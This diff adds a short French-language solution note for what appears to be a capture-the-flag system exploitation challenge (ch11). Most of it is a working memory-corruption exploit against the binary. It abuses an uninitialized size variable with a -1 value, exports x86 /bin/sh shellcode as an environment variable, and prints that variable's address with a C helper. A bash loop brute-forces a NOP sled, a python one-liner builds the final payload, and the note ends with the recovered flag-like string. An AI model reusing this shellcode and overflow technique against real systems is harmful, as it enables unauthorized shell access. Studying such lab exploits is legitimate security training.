@@ -1,0 +1,42 @@
+La variable size est utilisee sans etre initialisee.
+On va pouvoir passer -1 afin de passer la 1ere condition 
+` print "\xff\xff\xff\xff" > /tmp/toto `
+
+Il suffit de rajouter un '/' pour passer la 2e condition
+` print "\xff\xff\xff\xff/" > /tmp/toto `
+
+export SHELLCODE=`printf "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"`
+
+----------------------------
+#include <stdio.h>
+#include <stdlib.h>
+void main()
+{
+    char str[9];
+    sprintf(str, "%08X", (unsigned int)getenv("SHELLCODE"));
+    printf("\\x%c%c\\x%c%c\\x%c%c\\x%c%c", tolower(str[6]), tolower(str[7]), tolower(str[4]), tolower(str[5]), tolower(str[2]), tolower(str[3]), tolower(str[0]), tolower(str[1]));
+}
+----------------------------
+
+
+
+
+----------------------------
+#!/bin/bash
+SHELLCODE_ADDR="\x03\xfe\xff\xbf"
+NOP_OP=""
+while [ true ]; do
+    NOP_OP="\x90$NOP_OP"
+    echo `printf "\xff\xff\xff\xff/$NOP_OP$SHELLCODE_ADDR"` > /tmp/tototititutu
+    /challenge/app-systeme/ch11/ch11 /tmp/tototititutu
+done
+----------------------------
+
+
+
+
+
+
+python -c 'print "\xff\xff\xff\xff" + "/" + "\x90"*140 + "\xd2\xfd\xff\xbf"' > /tmp/testtest
+
+resultat = 8&1-|(5g8q!=
